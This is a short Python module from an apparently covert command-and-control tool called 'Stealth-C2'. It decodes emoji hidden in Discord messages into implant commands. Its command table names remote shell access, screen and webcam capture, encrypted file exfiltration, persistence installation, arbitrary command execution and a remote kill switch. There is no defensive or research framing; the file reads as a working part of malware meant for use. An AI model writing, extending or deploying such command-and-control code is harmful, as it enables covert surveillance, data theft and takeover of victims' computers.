"""
Stealth-C2 — Steganographic Decoder
Parses Discord messages for emoji-encoded commands.
NFKC normalisation is applied first to block homoglyph spoofing.
"""

from __future__ import annotations

import unicodedata

EMOJI_MAP: dict[str, str] = {
    "🐚": "cmd_shell",       # System info
    "📸": "cmd_screenshot",  # Screen / webcam capture
    "👋": "cmd_ping",        # Liveness check
    "📂": "cmd_exfil",       # Encrypted file exfiltration
    "🔄": "cmd_persist",     # Persistence installation
    "🛑": "cmd_exit",        # Remote kill switch
    "⚡": "cmd_exec",        # Arbitrary command execution
    "🔑": "cmd_keygen",      # AES key rotation
}


def normalize_homoglyphs(text: str) -> str:
    return unicodedata.normalize("NFKC", text)


def extract_intent(message_content: str) -> tuple[str, str | None] | None:
    """Return (command_id, args) or None if no trigger is found."""
    clean = normalize_homoglyphs(message_content)

    for emoji, cmd_id in EMOJI_MAP.items():
        if emoji not in clean:
            continue
        parts = clean.split(emoji, maxsplit=1)
        args  = parts[1].strip() if len(parts) > 1 and parts[1].strip() else None
        return (cmd_id, args)

    return None